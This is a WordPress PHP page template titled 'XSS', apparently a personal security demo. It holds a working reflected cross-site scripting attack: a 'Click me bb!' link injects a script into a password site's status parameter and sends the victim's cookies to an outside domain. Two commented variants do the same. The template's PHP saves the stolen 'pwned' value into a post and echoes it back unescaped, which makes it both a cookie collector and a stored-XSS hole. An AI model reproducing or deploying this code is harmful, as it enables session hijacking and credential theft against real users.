<?php
/**
 * Template Name: XSS
 *
 */

header("Allow Origin: https://passwords.briansimoni.com");
get_header();
?>

<div id="content">
    <div class="container">
        <?php
        ?>

        <!-- "https://passwords.briansimoni.com/?status=<script>window.location %3D 'https://briansimoni.com/xss?pwned%3D' %2B document.cookie;</script>" -->
        <!-- <a style="color: red;" href="https://passwords.briansimoni.com/?status=%3Cscript%3Ewindow.location%3D'http%3A%2F%2Flocalhost%3A9093%2Fxss%3Fpwned%3D'.concat(document.cookie)%3B%3C%2Fscript%3E">Click me bb!</a>-->
        <a style="color: red;" href="https://passwords.briansimoni.com/?status=%3Cscript%3Ewindow.location%3D'https%3A%2F%2Fbriansimoni.com%2Fxss%3Fpwned%3D'.concat(document.cookie)%3B%3C%2Fscript%3E">Click me bb!</a>
        <br />
        <?php

        $post = get_post();
        echo $post->post_content;
        $post->post_content;
        if(isset($_GET['pwned'])) {
            $post->post_content = $_GET['pwned'];
            wp_update_post($post);
        }

        ?>
    </div>
</div>


<?php
get_footer();